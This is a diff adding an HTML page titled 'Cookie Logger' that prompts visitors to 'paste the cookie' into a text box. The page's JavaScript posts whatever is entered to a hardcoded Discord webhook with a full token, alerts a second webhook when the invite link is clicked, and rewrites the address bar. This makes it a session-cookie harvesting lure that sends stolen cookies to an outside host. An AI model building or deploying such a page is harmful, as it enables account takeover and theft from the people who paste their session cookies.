@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- CHANGE ONLY THIS TEXT -->
+<title>Cookie Logger</title>
+
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #1f1c2c, #928dab);
+        color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        position: relative;
+    }
+
+    .discord-invite {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #5865F2;
+        color: white;
+        padding: 12px 18px;
+        border-radius: 8px;
+        font-weight: bold;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        transition: 0.3s;
+        text-decoration: none;
+    }
+
+    .discord-invite:hover {
+        background: #4752c4;
+    }
+
+    .container {
+        background: rgba(0,0,0,0.5);
+        padding: 40px;
+        border-radius: 15px;
+        box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+        text-align: center;
+    }
+
+    input[type="text"] {
+        width: 300px;
+        padding: 15px;
+        border-radius: 10px;
+        border: none;
+        margin-bottom: 20px;
+        font-size: 16px;
+    }
+
+    button {
+        padding: 15px 30px;
+        font-size: 16px;
+        border: none;
+        border-radius: 10px;
+        background: #ff4b2b;
+        color: white;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+
+    button:hover {
+        background: #ff416c;
+    }
+</style>
+</head>
+<body>
+
+<a class="discord-invite" onclick="sendInvite()">Join Discord</a>
+
+<div class="container">
+    <!-- CHANGE THIS TEXT ONLY IF YOU WANT -->
+    <h2>Cookie Logger</h2>
+
+    <input type="text" id="messageInput" placeholder="Type something...">
+    <br>
+    <button onclick="sendMessage()">Send</button>
+</div>
+
+<script>
+
+// 🔥 THIS CHANGES THE ADDRESS BAR
+history.pushState({}, "", "/Cookie-Loggerv2026");
+
+const messageWebhook = "https://discord.com/api/webhooks/1475146952269238363/6bejDU9CqsGSpFj8zvmpuaGtKCIz6Fogs111wtgzCAMCVpEYO3bA_TaifbAyOV9Lxtv3";
+const welcomeWebhook = "https://discord.com/api/webhooks/1475155925919858743/6TAlztU__6oKHAeXKiyAWvwgqmMXnwEoJefq3OIRhMK8gWOgGDvnr9KdlUrCAuFE3cu8";
+const inviteLink = "https://discord.gg/Pp3gUxHhf6";
+
+async function sendMessage() {
+    const message = document.getElementById('messageInput').value.trim();
+
+    if(message === "") {
+        alert("Please Paste the cookie!");
+        return;
+    }
+
+    try {
+        await fetch(messageWebhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+        });
+        alert("Message sent!");
+        document.getElementById('messageInput').value = "";
+    } catch (err) {
+        alert("Error sending message: " + err);
+    }
+}
+
+async function sendInvite() {
+    try {
+        await fetch(welcomeWebhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: `Someone clicked the Discord invite! DM the owner if there is any problems.` })
+        });
+    } catch(err) {
+        console.error("Failed to notify welcome webhook:", err);
+    }
+
+    window.open(inviteLink, "_blank");
+}
+</script>
+</body>
+</html>
